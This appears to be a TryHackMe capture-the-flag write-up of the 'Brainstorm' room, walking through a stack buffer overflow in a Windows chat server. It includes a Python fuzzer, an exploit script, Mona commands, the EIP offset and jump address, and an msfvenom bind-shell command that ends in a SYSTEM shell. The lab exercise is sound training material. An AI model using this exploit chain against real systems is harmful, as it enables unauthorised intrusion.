---
title: "Brainstorm TryHackMe Write-Up"
categories:
  - Write-Ups
---
[Brainstorm](https://tryhackme.com/room/brainstorm) is a Windows room inside of TryHackMe’s Offensive Pentesting learning path centered around exploiting a stack-based buffer overflow vulnerability.

Despite the changes to the structure of the OSCP exam, there’s still a possibility to receive a machine with a buffer overflow vulnerability as a low-privilege attack vector.

Therefore, Brainstorm is a solid practice room that can help you develop a straightforward approach to stack-based buffer overflows with the help of Immunity Debugger and Python.

![](https://user-images.githubusercontent.com/85040841/154784157-9936c1be-8be9-4326-82e2-9a7e1580bd8b.png)

# Scanning

Threader 3000 will quickly discover open ports on the machine, after which we can run an Nmap scan with default scripts and version detection.

```ruby
Threader 3000 - Multi-threaded Port Scanner
------------------------------------------------------------
Scanning target 10.10.206.121
------------------------------------------------------------
Port 21 is open
Port 3389 is open
Port 9999 is open
```

```ruby
┌──(kali㉿kali)-[~/thm/brainstormRoom]
└─$ sudo nmap -Pn -n -sCV -p 21,3389,9999 10.10.206.121 -T4 -oN nmapSCV
PORT     STATE SERVICE        VERSION
21/tcp   open  ftp            Microsoft ftpd
| ftp-syst:
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
3389/tcp open  ms-wbt-server?
| ...
9999/tcp open  abyss?
| ...
|     Welcome to Brainstorm chat (beta)
|     Please enter your username (max 20 characters): Write a message:
```

**Port 9999** hosts an application called "Brainstorm chat."

![](https://user-images.githubusercontent.com/85040841/154786278-85bc599e-4def-4f88-963f-5fdf0988786e.gif)

Anonymous FTP login is allowed, so let’s enumerate the FTP server.

# Enumeration

```ruby
┌──(kali㉿kali)-[~/thm/brainstormRoom]
└─$ ftp 10.10.206.121
Name (10.10.206.121:kali): anonymous
. . .
ftp> dir
. . .
08-29-19  07:36PM       <DIR>          chatserver
ftp> cd chatserver
. . .
ftp> dir
. . .
08-29-19  09:26PM                43747 chatserver.exe
08-29-19  09:27PM                30761 essfunc.dll
```

After logging in with anonymous access, I discovered a folder named `chatserver`.

Inside of that directory, there were two files:

- `chatserver.exe`, the chat server executable that corresponds to port 9999 on the target
- `essfunc.dll`, a dynamic-link library file used by chatserver.exe

```ruby
. . .
ftp> prompt OFF
Interactive mode off.
ftp> binary
200 Type set to I.
ftp> mget *
. . .
```

I downloaded them to my machine for closer inspection.

![](https://user-images.githubusercontent.com/85040841/154784178-c4579cec-cd59-4578-a2f6-bb1293ac68fc.png)

They’re both 32-bit Windows files, so I’ll use PowerShell and a Python web server to transfer them to my Windows 11 VM.

![](https://user-images.githubusercontent.com/85040841/154784163-1c25b953-d7c3-4a4d-8f2a-8ac194e0e2b4.png)

![](https://user-images.githubusercontent.com/85040841/154784164-c56006b6-6872-4f84-a883-00adaa4248eb.png)

With the files on my Windows VM that has Immunity Debugger and Mona installed and security features disabled, I can begin to experiment with `chatserver.exe`.

![](https://user-images.githubusercontent.com/85040841/154784165-5dbfd7f1-375f-43d0-a2f6-c164685a5288.png)

After starting the server and observing what appeared, I noticed that it was "Waiting for connections."

Inside of Kali, I confirmed that it was identical to the target’s chat server by connecting to port 9999 with Netcat and interacting with the program.

# Fuzzing

Let’s start the program in Immunity Debugger and fuzz the application to determine a breakpoint.

I’ll test the username field first by entering a 100-character long string of *A’s* into it.

![](https://user-images.githubusercontent.com/85040841/154784166-0e51e9ca-de7a-480d-a97f-6bf8a304d930.png)

Nothing promising, as the length of my username was trimmed to the stated limit.

After sending an even longer string and viewing the outputs on the client-side and server-side, it was clear that the server handled the username input correctly by shortening it to 20 characters.

That makes the only remaining attack vector the message field of the application.

Knowing this, I wrote a Python script, **fuzzer.py**, that sends the chat server an arbitrary username and fuzzes for a breakpoint in the message field.

```python
import socket, time, sys, os

ip = "192.168.56.110"
port = 9999
timeout = 4
string = "A" * 100

print(f"Target IP: {ip}\n")

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
  s.settimeout(timeout)
  s.connect((ip, port))
  s.send(bytes("USER", "latin-1"))
  s.recv(1024)
  while True:
    num_bytes = len(string)
    try:   
      print(f"Fuzzing {ip} with {num_bytes} bytes")
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
    except:
      print(f"Fuzzing crashed at {num_bytes} bytes\n")
      os.system(f"msf-pattern_create -l {num_bytes}")
      sys.exit(0)
    string += 100 * "A"
    time.sleep(1)
```

![](https://user-images.githubusercontent.com/85040841/154787158-2c0008ef-8dc2-4659-83ba-2ac89e0ccd53.gif)

# Exploitation

As you can see, the script automatically generated a Metasploit pattern by executing `msf-pattern_create -l 2800`.

We can use this long string of unique patterns to identify the EIP offset we need.

I’ll assign it to the `payload` variable that resides in another Python script I wrote, **exploit.py**:

```python
import socket, time

ip = "192.168.56.110"
port = 9999

offset = 0
overflow = "A" * offset
retn = ""
padding = "<long msf-pattern goes here, excluded for brevity>"
payload = ("")
postfix = ""

"""
# Bad Chars:
# \x00
bad_chars = [
    b"\x00"
]
if len(bad_chars) <= 1:
    print(f"!mona findmsp -distance {len(payload)}")
else:
    for bad_char in bad_chars:
        payload = payload.replace(bad_char, b"")
"""

print(f"Offset: {offset}\nPayload: {len(payload)} chars\n")

buffer = overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  s.send(bytes("NAME", "latin-1"))
  s.recv(1024)
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

![](https://user-images.githubusercontent.com/85040841/154784158-41f43768-f511-417b-bef9-c0697588d925.gif)

As you can see in the GIF above, I ran the exploit and copied a Mona command that we can use to determine the Extended Instruction Pointer (EIP) offset.

`!mona findmsp -distance 2800`

**EIP is a register in x86 (32-bit) architectures that controls the flow of a program.**

The "findmsp" command in Immunity Debugger will find all instances/references to our cyclic Metasploit pattern in memory, registers, etc.

![](https://user-images.githubusercontent.com/85040841/154784168-e21a1a8a-b376-4cca-8876-39203d6d9f72.png)

Now that we know the EIP offset is 2012, let’s assign that value to our `offset` variable in exploit.py.

(Don’t forget to restart the chat server with **CTRL+F2** and **F9**.)

Let's start to weed out the application’s bad characters.

"Bad characters" are unwanted characters that have the potential to break our shellcode.

There’s a different set of bad characters for every program with a buffer overflow vulnerability.

\x00 (NULL byte) is always a bad character, and some of the widespread ones are:

- \x0a for Line Feed
- \x0d for Carriage Return
- \xff for Form Feed

Inside of Immunity Debugger, we’ll execute `!mona config -set workingfolder c:\mona\%p` to assign our working folder and `!mona bytearray -cpb "\x00"` to generate a byte array that excludes the null byte (take note of the output location of the binary file).

![](https://user-images.githubusercontent.com/85040841/154784171-3d1a1584-344e-4c3e-ba8b-7a13c3239647.png)

We can run a short Python script to print 255 bad chars and then copy them.

```python
for x in range(1, 256):
      print("\\x" + "{:02x}".format(x), end='')
print()
```

![](https://user-images.githubusercontent.com/85040841/154784155-25f03c47-b618-4e2b-a7f4-e2c087675ba1.gif)

Within exploit.py, we’ll set `retn` to "AAAA" and assign the string of bad chars to the `payload` variable.

![](https://user-images.githubusercontent.com/85040841/154784172-d1a5d7b8-2228-4134-bfb7-69a0207d5c8c.png)

After running exploit.py, we can double-click the value of the ESP register and copy it.

![](https://user-images.githubusercontent.com/85040841/154784173-1dfb99ba-9e25-4cae-9170-6c3b7ef1e73a.png)

With the server still offline, we'll execute the following command to initiate a byte comparison:

```python
!mona compare -f C:\mona\chatserver\bytearray.bin -a 00A6EEAC
```
![](https://user-images.githubusercontent.com/85040841/154784174-ce25f12c-5460-4bd0-9ef3-01e157b4a312.png)

Great! Mona returned a status of "Unmodified", which is precisely what we want to see.

This tells us that the NULL byte is the only bad character for the chat server.

If we received a list of potential bad chars, we would have to append suspected ones to our "bad_chars" list in exploit.py, generate a new Mona bytearray excluding the bad chars, run the compare command, and repeat the process until "Unmodified" is returned.

If you’re interested in practicing that aspect of stack-based buffer overflows in addition to everything we’ve covered thus far, check out [this OSCP prep room](https://tryhackme.com/jr/bufferoverflowprep) later on.

Our next step is to identify a jump point based on our sole bad character.

`!mona jmp -r esp -cpb "\x00"`

![](https://user-images.githubusercontent.com/85040841/154784175-d2c5562d-40f3-4c1e-b3ab-3efc12b9dfd3.png)

The "False" values indicate that certain protections are not in place, so it’s always best to keep that in mind when selecting the best jump point.

We received nine pointers. Out of all of them, the first one will suffice.

Now that we have the value "**0x62501fdf**", our objective is to write the jump address in **little-endian format** (because chatserver.exe is a 32-bit application) and assign it to the **`retn`** variable.

This process is quite simple, as all we have to do is reverse the order of the address.

I’ll also set the `padding` variable to a string of 16 "No Operation" \x90 bytes to provide sufficient space in memory for our payload to unpack itself.

![](https://user-images.githubusercontent.com/85040841/154784162-acd1bd12-6021-4f1c-b131-e33329890bab.gif)

Our penultimate step is to generate a bind shell with msfvenom, excluding the NULL byte with the **-b** flag because it’s our only bad character.

`msfvenom -p windows/shell_bind_tcp lport=4444 exitfunc=thread -b "\x00" -f c`

I prefer bind shells over reverse shells for OSCP buffer overflow prep because they prevent issues that your report reviewer can have by eliminating the need for them to generate their own shellcode with msfvenom.

![](https://user-images.githubusercontent.com/85040841/154784156-a89d2c90-367a-4c34-bbab-bebbf137c98d.gif)

Let’s restart `chatserver.exe` and test the exploit on my Windows VM!

![](https://user-images.githubusercontent.com/85040841/154784176-885e89c3-5a9f-42dd-ad72-df4dbcfb4c8d.png)

And we’re in! Our exploit is good to go.

We have to change the `ip` variable to match the target’s IP address, then run the exploit and connect to the listening port.

![](https://user-images.githubusercontent.com/85040841/154784177-524a906a-246e-4ae2-8bc1-01a070dac3d1.png)

Boom! We’re instantly NT AUTHORITY\SYSTEM.

# Root Flag

```python
C:\Windows\system32>dir C:\Users

 Directory of C:\Users

08/29/2019  09:20 PM    <DIR>          .
08/29/2019  09:20 PM    <DIR>          ..
08/29/2019  09:21 PM    <DIR>          drake
11/20/2010  11:16 PM    <DIR>          Public

C:\Windows\system32>cd C:\Users\drake\Desktop

C:\Users\drake\Desktop>dir

 Directory of C:\Users\drake\Desktop

08/29/2019  09:55 PM    <DIR>          .
08/29/2019  09:55 PM    <DIR>          ..
08/29/2019  09:55 PM                32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)  19,597,156,352 bytes free

C:\Users\drake\Desktop>type root.txt

5b10************************8f8a
```
